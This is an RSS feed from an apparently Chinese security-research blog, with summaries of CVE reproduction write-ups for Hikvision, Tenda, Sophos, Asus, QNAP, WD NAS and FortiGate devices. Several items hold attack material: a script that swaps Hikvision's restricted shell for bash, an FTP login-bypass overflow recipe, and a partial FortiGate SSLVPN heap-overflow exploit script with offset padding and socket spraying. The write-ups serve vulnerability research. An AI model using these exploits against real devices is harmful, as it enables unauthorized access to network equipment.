<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>CAI dog</title>
    <link>https://jellyfish-pro.github.io/</link>
    <description>Recent content on CAI dog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language><atom:link href="https://jellyfish-pro.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>[置顶] 注意事项</title>
      <link>https://jellyfish-pro.github.io/ctf/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</guid>
      <description>由于不可抗因素，以下的ctf不会提供二进制文件，并且一些文章的结构会有所缺失，请理解 </description>
    </item>
    
    <item>
      <title>[置顶] 注意事项</title>
      <link>https://jellyfish-pro.github.io/note/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</guid>
      <description>这里总结了一些可以快速使用的命令，并不会涉及原理，如果您使用这些命令后报错或者是没有达到效果，请不要在此过多的纠结 </description>
    </item>
    
    <item>
      <title>[置顶] 注意事项</title>
      <link>https://jellyfish-pro.github.io/posts/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</guid>
      <description>因为某些不可抗力，所以在您阅读以下文章时，会发现文章的结构有所缺失，请理解。 </description>
    </item>
    
    <item>
      <title>arm交叉编译</title>
      <link>https://jellyfish-pro.github.io/note/arm%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/arm%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/</guid>
      <description>arm交叉编译 环境搭建 //arm交叉编译链接工具：sudo apt-get install gcc-arm-linux-gnueabi g++-arm-linux-gnueabi//arm浮点型交叉编译链接工具：sudo apt-get install gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf 编译 //arm_test.cinclude &amp;lt;stdio.h&amp;gt;int main(void){printf(&amp;#34;hello world\n&amp;#34;);return 0;} 同样，如果直接编译的话，是动态编译：
arm-linux-gnueabi-gcc arm_test.c -o test 需要使用qemu的-L参数指定动态链接库：
qemu-arm-static -L /usr/arm-linux-gnueabi test 也可以使用使用静态链接：
arm-linux-gnueabi-gcc arm_test.c -static -o test </description>
    </item>
    
    <item>
      <title>CVE-2017-7921 海康威视权限绕过导致密码泄露漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2017-7921-%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2017-7921-%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</guid>
      <description>CVE-2017-7921 海康威视权限绕过导致密码泄露漏洞 漏洞简介 该漏洞存在于海康威视摄像头设备上，因为逻辑错误，导致没有判断用户名和密码。
环境搭建 这里使用的是海康威视的摄像头设备(DS-2CD1301D-I)，因为这个设备没有telnet和ssh命令，所以无法远程直接连上去。因此这里是连接的串口，串口是由师兄之前测试其他漏洞的时候焊上去的，故这里不介绍如何连接串口。
修改psh 连接串口后，也无法直接获取shell，因为海康威视自己写了一个shell名叫psh，如果直接启动设备的话，会直接取得psh，如下：
如果想要绕过这个psh，我们则需要修改内核参数，拿到普通shell。
首先我们ctrl+U进入设置：
随后使用如下命令修改内核参数：
HKVS # printenv bootargs bootargs=console=ttyS0,115200 root=/dev/ram0 mem=42MHKVS # setenv bootargs console=ttyS0,115200 root=/dev/ram0 mem=42M singleHKVS # saveenv Saving Environment to SPI Flash...Erasing SPI flash...Writing to SPI flash...done 修改后使用reset命令重启：
需要注意的是，这里的内核还没有被加载，只是内核提供的一个手动启动内核的环境。因此我们在这里修改了psh后，再启动内核后，就可以获得正常的shell了。
#!/bin/bashrm /bin/pshtouch /bin/pshecho &amp;#34;#!/bin/bash&amp;#34; &amp;gt; /bin/pshecho &amp;#34;/bin/bash&amp;#34; &amp;gt;&amp;gt; /bin/pshchmod +x /bin/psh 随后执行linuxrc内核就可以获得普通的shell：
其实这个阶段如果不想手动修改psh的话，可以修改ip地址，使用挂载共享文件夹的方式，从共享文件夹中复制一个过来。
传递文件 虽然现在我们获得了正常的shell，但是设备上的busybox是被严重阉割过的，以至于连wget和curl命令都没有，也没有scp命令。没有这些命令，应该怎么传递文件呢？
我们可以使用nfs共享文件夹：
mount -t nfs 192.168.110.30:/tmp/nfs /run -o nolock 随后把要传输的文件复制到共享文件夹就好了。</description>
    </item>
    
    <item>
      <title>CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2018-5767-tenda-ac15%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2018-5767-tenda-ac15%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</guid>
      <description>CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现 复现目的： 熟悉设备漏洞的环境模拟（qemu-user模式的利用） 了解基本的arm指令和函数调用方式，并且构建ROP利用链 漏洞基本信息： 该漏洞是18年出现的漏洞，由于没有对用户输入字符长度进行限制，导致包中的cookie字段过长时会产生栈溢出漏洞
环境搭建 环境搭建前言 由于是arm架构的漏洞，所以我们需要利用qemu进行环境仿真。（如果有富哥们也可以直接买真机，顺便V我50）
这里需要注意，ubuntu如果直接使用apt安装qemu，会因为qemu版本太低导致仿真环境出现问题，所以我选择的是自己编译高版本的qemu （也就是5.2.0，也没有多高）
环境搭建正文 首先，我们下载TENDA-AC15的固件 ，固件的版本为：15.03.1.16_multi
随后使用binwalk提取固件
binwalk -Me1 US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin#注意这里的‘1’是数字1 进入提取出来的文件夹后，我们可以看到一个文件名字类似于linux系统root目录的文件：
通过检查一下busybox，目的是检查该固件需要的位数和架构：
arm架构，32位，小端。
所以我们需要使用qemu-arm-static来拟真环境
sudo ./qemu-arm-static -L . ./bin/httpd 这里的 -L .是qemu-arm-static自带的一个chroot指令，可以理解为 chroot ./
执行命令后，我们看到程序在 Welcome to ...处不动了。
为了搞清具体什么问题，我们可以在ida中搜索字符串，找到这个位置：
通过汇编，我们可以看到大概的流程，显示输出 WeLoveLinux， 随后检查我们的网络环境，如果没有检查通过，则会在这段代码中一直循环。
这里我们可以通过两个方法解决这个问题：
给qemu设置一个虚拟网络 修改二进制文件直接跳过这个检查 这里我选择给ubuntu设置一个桥，然后桥接到qemu：
sudo apt install uml-utilities bridge-utilssudo brctl addbr br0sudo brctl addif br0 ens33sudo ifconfig br0 upsudo dhclient br0 通过 ifconfig可以查看到桥已经创建成功
随后我们再次运行httpd就可以看到刚刚问题被解决了，但是又遇到了另外一个问题：</description>
    </item>
    
    <item>
      <title>CVE-2022-1040 sophos身份验证绕过漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2022-1040-sophos%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2022-1040-sophos%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</guid>
      <description>漏洞简介 该漏洞是存在于Sophos Firewall，版本小于等于18.5.3的身份验证绕过漏洞。
该漏洞是因为sophos Firewall框架中java和prel对json数据的处理方式出现了偏差，产生的漏洞。
环境复现 sophos Firewall提供的不是物理设备，而是提供的虚拟机。直接去官网下载即可，需要注意的是，官网只能下载新版本，但是可以修改url中的版本号，下载有漏洞的版本。
随后使用VMware打开.ova文件就可以直接搭建好sophos环境。
不过这里需要注意一点就是网卡的配置：
sophos有三张网卡，我们需要将三张网卡对应上不同的VMware虚拟网卡：
像上图一样，网卡1使用桥接连接虚拟网卡1（VMnet1），另外两张使用net模式连接虚拟网卡8（VMnet8）。
这里还有一点需要注意，虚拟网卡8我们可以不用特别设置，但是虚拟网卡1我们需要将子网ip改为172.16.16.0
接着打开虚拟机，断网后登录 https://172.16.16.16:4444看到sophos配置界面则表示虚拟机配置成功。
第一次访问sophos，sophos会让我们进行一些常规设置，这时如果不断网，sophos则会自动更新，断网后则进入离线模式。
配置成功后，再次访问 https://172.16.16.16:4444，就可以看到登陆界面了：
json数据处理差异分析 这里我们不会分析具体的代码，这里只是介绍sophos Firewall的框架，并且介绍该架构为什么会产生这个漏洞。
sophos框架分析 因为这个漏洞和sophos的框架相关，所以我们先介绍sophos的架构：
通过这个图我们可以看到，sophos Firewall前面使用了 Apache和jetty来进行信息的接受和分发，而后面则使用 csc和perl来执行具体的命令。
Apache和jetty这里就不多做介绍。这里需要注意的是：这里的perl并不完全等于我们在linux中使用的perl命令。
sophos中的perl是指向csc的：
而对于csc的反编译，我们可以发现在csc中有许多和json数据相关的动态链接库函数： 对这些函数进行搜索时，我们就可以发现，这些函数来自于一个名叫 json-c的库。
这也就说明，csc调用这个 json-c库对json数据进行解析，然后再传给perl。
漏洞逻辑分析 那么，这个框架为什么会产生漏洞呢，原因就在于，框架接受分发json数据时使用的是java，而后面处理json时却使用的是 json-cC语言库。而这两种语言对于json数据的处理存在差异，正是这个差异导致了漏洞的出现。
我们可以使用一个简单例子：
对于处理同样的数据：
{ &amp;quot;name\u0000ef&amp;quot;: &amp;quot;test&amp;quot;, &amp;quot;name&amp;quot;:&amp;quot;test2&amp;quot; }
对于java来说：
import org.json.JSONObject;import org.json.JSONException;import java.io.*;class test {public static void main(String[] args) {try{System.out.println(new JSONObject(&amp;#34;{ \&amp;#34;name\&amp;#34;: \&amp;#34;test\&amp;#34;, \&amp;#34;name\\u0000ef\&amp;#34;: \&amp;#34;test2\&amp;#34;}&amp;#34;));}catch (JSONException e){System.</description>
    </item>
    
    <item>
      <title>CVE-2022-26376 华硕固件内存崩溃漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2022-26376-%E5%8D%8E%E7%A1%95%E5%9B%BA%E4%BB%B6%E5%86%85%E5%AD%98%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E%E6%9C%AA%E5%88%A9%E7%94%A8/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2022-26376-%E5%8D%8E%E7%A1%95%E5%9B%BA%E4%BB%B6%E5%86%85%E5%AD%98%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E%E6%9C%AA%E5%88%A9%E7%94%A8/</guid>
      <description>CVE-2022-26376 华硕固件内存崩溃漏洞 漏洞简介 该漏洞存在于华硕固件和梅林固件中，不同型号对应的固件版本也不一致。如果想了解具体的型号，可以在NVD - CVE-2022-26376找到。
根据塔洛斯的说法：
A memory corruption vulnerability exists in the httpd unescape functionality of Asuswrt prior to 3.0.0.4.386_48706 and Asuswrt-Merlin New Gen prior to 386.7.. A specially-crafted HTTP request can lead to memory corruption. An attacker can send a network request to trigger this vulnerability.
这个漏洞会导致内存损坏。通过研究确实可以造成溢出，但并不能控制程序流。简言之就是，这个漏洞会造成内存损坏，但难以被利用。
漏洞分析 这里我使用的是梅林的386.5.2的源码
这里就是漏洞点，程序的大致流程为，判断字符串s中有没有百分号，如果有就利用sscanf函数对百分号和百分号后的两位进行解码，并将解码后的字符放在原百分号的位置，随后使用strlcpy和strncpy来覆盖百分号后两个字符。例如字符%41%42：
字符串中有百分号，使用sscanf函数对%41解码，并将解码出来的A放到原百分号的位置，字符变味了：A41%42 随后利用strlcpy将跳过**41将%42**放入s_tmp 最后，使用strncpy将%42接在A后面，原字符串就变为了：A%42 这就是一个解码url的循环。
乍一看，确实没问题，但是问题是如果我们将%41%42改了%41%a的话，就会出现问题：
第一轮解码，将会正常解析，字符串会变为：A%a
但当解析%a时就会出问题：
同样检测到百分号之后，使用sscanf函数对*%a进行解析，会解析为\n*，随后放到百分号的位置，字符串变为：A\na。 这时，strlcpy函数任然会读取原百分号（现在为\n）后两个字节放到s_tmp中。 这里我们可以看到，字符串中\n后只有一个字节（a）了。而strlcpy函数会读取\n后两个字节，这就说明会发生读取越界。
这里我们可以在设备上调试一下：
#!/usr/bin/python3import socketurl = b&amp;#34;GET /Main_Login.</description>
    </item>
    
    <item>
      <title>CVE-2022-27596 威联通5.0.1sql注入漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2022-27596-%E5%A8%81%E8%81%94%E9%80%9A5.0.1sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2022-27596-%E5%A8%81%E8%81%94%E9%80%9A5.0.1sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</guid>
      <description>CVE-2022-27596 威联通5.0.1sql注入漏洞 漏洞简介 该漏洞是威联通(qnap)旗下的NAS设备的固件上的数据库注入漏洞。
固件版本为：
该漏洞出现在QTS和QTS_hero的5.0.1版本的固件上且只出现在这一个版本的固件上，应该是一个新添加的功能发现了漏洞，然后被修复了。
环境搭建 这里是直接使用的设备(qnap TS-853 pro)
该设备可以直接通过ssh和telnet连接上shell：
连上shell后会出现选择菜单，但退出菜单后，就可以选择是否进入linux的shell
漏洞分析 对于qnap的漏洞，在网上基本除了CVE号，很少有其他的信息。其原因大家懂的都懂。
针对这种漏洞，我们需要通过比较补丁的方式来定位漏洞点，至于如何定位到该漏洞请看这篇文章：
[CVE-2022-27596 | CataLpa&amp;rsquo;s Home (wzt.ac.cn)]
该文章虽然写了怎么调试漏洞，但是我在调试时，每次程序都不能断在关键的位置，故下面采用其他的方法进行调试。
静态分析 该漏洞存在authLogin.cgi的库文件中libuLinux_NAS.so.0.0的sub_7FFFF76BB4CB函数中
该函数删除了符号，但可以通过搜索字符串找到。
v9 = s···if ( *(_QWORD *)(a8 + 24) ){v13 = *(const char **)(a8 + 24);v14 = strlen(s);a2 = &amp;#34;AND token = &amp;#39;%s&amp;#39; &amp;#34;;sprintf(&amp;amp;s[v14], &amp;#34;AND token = &amp;#39;%s&amp;#39; &amp;#34;, v13);}···v49 = sqlite3_mprintf(&amp;amp;byte_7FFFF76DFA7F, a2, v9);···v48 = sqlite3_mprintf(&amp;#34;SELECT * FROM QTOKEN %s %s %s;&amp;#34;, v49, v51, v50);···sqlite3_free(v48) 漏洞点则在sprintf()函数，该函数使用的%s，会直接将v13参数上的字符拼接到&amp;quot;AND token = &#39;%s&#39; &amp;quot;上，最后拼接到sql语句上。但是v13是可以被我们控制的，也就意味着sql语句可以被我们控制</description>
    </item>
    
    <item>
      <title>CVE-2022-29844 西数nas My_Cloud_Pro_Series_PR4100 ftp权限绕过漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2022-29844-%E8%A5%BF%E6%95%B0nas-my_cloud_pro_series_pr4100-ftp%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2022-29844-%E8%A5%BF%E6%95%B0nas-my_cloud_pro_series_pr4100-ftp%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</guid>
      <description>CVE-2022-29844 西数nas My_Cloud_Pro_Series_PR4100 ftp权限绕过漏洞 漏洞简介 该漏洞是存在于西数nas上的一个ftp权限绕过漏洞。其广泛存在于西数的多款nas设备中。但在设备中，ftp服务并不是默认开启的。故该漏洞的利用存在一定的限制。
环境搭建 该漏洞是Luca Moro (@johncool__) 在Pwn2Own比赛中曝光的。故我们可以直接拿比赛中使用的固件。
因为漏洞存在于ftp服务中，而西数nas设备的ftp服务来自于开源项目：Pure-FTPd。
当然西数在其基础上进行了，首先下载西数所有的GPL，解压后进入WDMyCloud_PR4100_GPL_v5.24.108_20220826/open-source-packages/pure-ftpd/pure-ftpd-1.0.47/目录
执行下面的命令将pure-ftpd修改为西数的版本：
tar xf pure-ftpd_1.0.47.orig.tar.gzcd pure-ftpd-1.0.47.origfor patch_name in `ls ../patch`; do echo &amp;#34;--&amp;gt;patch name=$patch_name&amp;#34; ; patch -p1 -i ../patch/${patch_name} ; done 设备启动流程 接下来我们将固件进行解压，该固件直接用binwalk解压就行。
解压下来后我们可以观察到，固件中有一个cpio-root和squashfs-root文件夹。
根据以往的经验，cpio-root文件夹是BootLoader启动内核阶段的临时文件系统。而squashfs-root是设备真正的文件系统。
但在西数nas设备中却不太一样，进入squashfs-root文件夹中，我们可以发现这里面的bin文件夹下没有文件：
这就意味着直接使用这个文件夹作为根目录的话，是不能执行命令的。并且在etc文件夹下没有和系统启动相关的文件。
bin文件夹下没有东西，那么整个系统是怎么运行的呢？我们就要来到系统运行的上一步：BootLoader加载内核。
刚刚说到，cpio-root文件夹中有一个文件系统，来到这个文件夹下的etc目录，我们就可以看到：
这里就出现了一个inittab的系统初始化文件，在这个文件中就指明了系统启动需要去找的文件：/etc/rc.sh 注意这里不是指本机的etc目录
而在/etc/rc.sh 中有一段代码，会将squashfs文件夹挂载到当前文件系统的*/usr/local/modules*目录下：
可以看到这段代码已经被注释掉，原因是开发者将这段代码集成到了上面的chk_image二进制文件中。
将squashfs文件夹挂载过来后，/etc/rc.sh 会在最后运行一个脚本：system_init
**注意：**这里的路径是已经被挂载后的路径。
这个system_init的主要内容就是将squashfs文件夹中的文件复制到当前文件系统对应的文件中，并且启动各种服务。
启动ftp服务 上面将系统启动的流程理清了，理清了之后我们就可以尝试启动环境。但是可惜的是，虽然该设备的架构是x86-64，但是任然不能启动，原因可能是设备自检没有过。
虽然环境不能启动，但是我们可以直接启动ftp服务呀。
我们可以直接启动ftp服务：
漏洞分析 静态分析 因为这是一个权限绕过漏洞，而该ftp文件中就有两个专门处理登录的函数：douser和dopass，而漏洞点则出现在douser函数中： 通过源码，我们可以看到这里并没有对username的长度进行限制，username是函数的参数，这个参数是用户可以控制的。
而auth_name本身的长度只有2048个字节，如果我们输入超过2048个字节就会造成溢出。那么，我们要溢出多少字节呢？通过ida可以更加直观的看到：
这里可以看到，下面有一个loggedin。我们需要覆盖到这个变量，覆盖一个字节就可以了。那么就需要溢出98个字节。一共要给auth_name输入2048+98个字节。
那么为什么要覆盖着loggedin呢？
其实从名称就可以猜到，这个变量的作用是标记用户已经登录。而实际上也确实是这个作用：
动态分析 这里我们采用gdb进行调试，但再调试之前，我们需要先明确程序到漏洞点的流程，其BT如下：
但需要注意的是：该程序到漏洞点，会经历两次fork函数，第一次fork函数我们需要跟随子进程，而第二次fork函数我们需要跟随父进程。
故我们需要在gdb中选择适当的时机将follow-fork-mode设置为parent
其实我们找到两个fork函数，并在他们中间设置就好了，但是这里我为了方便，直接将断点打在了accept_client函数里的call doit处，设置好follow-fork-mode后再在douser函数处打断点，运行到漏洞点。</description>
    </item>
    
    <item>
      <title>CVE-2022-42475 FortiGate SSLVPN 堆溢出漏洞分析与利用</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2022-42475-fortigate-sslvpn-%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2022-42475-fortigate-sslvpn-%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</guid>
      <description>CVE-2022-42475 FortiGate SSLVPN 堆溢出漏洞分析 漏洞简介 该漏洞存在于Fortigate中的SSLVPN服务上，由于对Content-Length值的错误处理，并且没有控制数据包的长度，导致了堆溢出。
漏洞范围 5.0.0 &amp;lt;= FortiOS &amp;lt;= 5.0.145.2.0 &amp;lt;= FortiOS &amp;lt;= 5.2.155.4.0 &amp;lt;= FortiOS &amp;lt;= 5.4.135.6.0 &amp;lt;= FortiOS &amp;lt;= 5.6.146.0.0 &amp;lt;= FortiOS &amp;lt;= 6.0.156.2.0 &amp;lt;= FortiOS &amp;lt;= 6.2.116.4.0 &amp;lt;= FortiOS &amp;lt;= 6.4.107.0.0 &amp;lt;= FortiOS &amp;lt;= 7.0.87.2.0 &amp;lt;= FortiOS &amp;lt;= 7.2.21.0.0 &amp;lt;= Fortiproxy &amp;lt;= 1.0.71.1.0 &amp;lt;= Fortiproxy &amp;lt;= 1.1.61.2.0 &amp;lt;= Fortiproxy &amp;lt;= 1.2.132.0.0 &amp;lt;= Fortiproxy &amp;lt;= 2.</description>
    </item>
    
    <item>
      <title>CVE-2022-42475 FortiGate 飞塔堆溢出漏洞利用方式</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2022-42475-fortigate-%E9%A3%9E%E5%A1%94%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2022-42475-fortigate-%E9%A3%9E%E5%A1%94%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</guid>
      <description>飞塔堆溢出漏洞利用方式 查看偏移 我们使用以下的脚本，发送包，查看偏移：
import socketimport sslfrom pwn import *import pwnpath = &amp;#34;/remote/login&amp;#34;.encode()ip = &amp;#34;192.168.113.66&amp;#34;port = 10443padding = b&amp;#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaaumaaunaauoaaupaauqaauraausaautaauuaauvaauwaauxaauyaauzaavbaavcaavdaaveaavfaavgaavhaaviaavjaavkaavlaavmaavnaavoaavpaavqaavraavsaavtaavuaavvaavwaavxaavyaavzaawbaawcaawdaaweaawfaawgaawhaawiaawjaawkaawlaawmaawnaawoaawpaawqaawraawsaawtaawuaawvaawwaawxaawyaawzaaxbaaxcaaxdaaxeaaxfaaxgaaxhaaxiaaxjaaxkaaxlaaxmaaxnaaxoaaxpaaxqaaxraaxsaaxtaaxuaaxvaaxwaaxxaaxyaaxzaaybaaycaaydaayeaayfaaygaayhaayiaayjaaykaaylaaymaaynaayoaaypaayqaayraaysaaytaayuaayvaaywaayxaayyaayzaazbaazcaazdaazeaazfaazgaazhaaziaazjaazkaazlaazmaaznaazoaazpaazqaazraazsaaztaazuaazvaazwaazxaazyaazzababacabadabaeabafabagabahabaiabajabakabalabamabanabaoabapabaqabarabasabatabauabavabawabaxabayabazabbbabbcabbdabbeabbfabbgabbhabbiabbjabbkabblabbmabbnabboabbpabbqabbrabbsabbtabbuabbvabbwabbxabbyabbzabcbabccabcdabceabcfabcgabchabciabcjabckabclabcmabcnabcoabcpabcqabcrabcsabctabcuabcvabcwabcxabcyabczabdbabdcabddabdeabdfabdgabdhabdiabdjabdkabdlabdmabdnabdoabdpabdqabdrabdsabdtabduabdvabdwabdxabdyabdzabebabecabedabeeabefabegabehabeiabejabekabelabemabenabeoabepabeqaberabesabetabeuabevabewabexabeyabezabfbabfcabfdabfeabffabfgabfhabfiabfjabfkabflabfmabfnabfoabfpabfqabfrabfsabftabfuabfvabfwabfxabfyabfzabgbabgcabgdabgeabgfabggabghabgiabgjabgkabglabgmabgnabgoabgpabgqabgrabgsabgtabguabgvabgwabgxabgyabgzabhbabhcabhdabheabhfabhgabhhabhiabhjabhkabhlabhmabhnabhoabhpabhqabhrabhsabhtabhuabhvabhwabhxabhyabhzabibabicabidabieabifabigabihabiiabijabikabilabimabinabioabipabiqabirabisabitabiuabivabiwabixabiyabizabjbabjcabjdabjeabjfabjgabjhabjiabjjabjkabjlabjmabjnabjoabjpabjqabjrabjsabjtabjuabjvabjwabjxabjyabjzabkbabkcabkdabkeabkfabkgabkhabkiabkjabkkabklabkmabknabkoabkpabkqabkrabksabktabkuabkvabkwabkxabkyabkzablbablcabldableablfablgablhabliabljablkabllablmablnabloablpablqablrablsabltabluablvablwablxablyablzabmbabmcabmdabmeabmfabmgabmhabmiabmjabmkabmlabmmabmnabmoabmpabmqabmrabmsabmtabmuabmvabmwabmxabmyabmzabnbabncabndabneabnfabngabnhabniabnjabnkabnlabnmabnnabnoabnpabnqabnrabnsabntabnuabnvabnwabnxabnyabnza&amp;#39;def create_ssl_ctx():_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)_socket.connect((ip, port))_default_context = ssl._create_unverified_context()_socket = _default_context.wrap_socket(_socket)return _socketdef make_socks(payload):socks = []for i in range(60):sk = create_ssl_ctx()data = b&amp;#34;POST &amp;#34; + path + b&amp;#34; HTTP/1.1\r\nHost: 192.168.113.1\r\nContent-Length: 100\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&amp;#34;sk.sendall(data)socks.append(sk)for i in range(20, 40, 2):sk = socks[i]sk.</description>
    </item>
    
    <item>
      <title>CVE-2022-46641 D-Link dir-846命令注入漏洞</title>
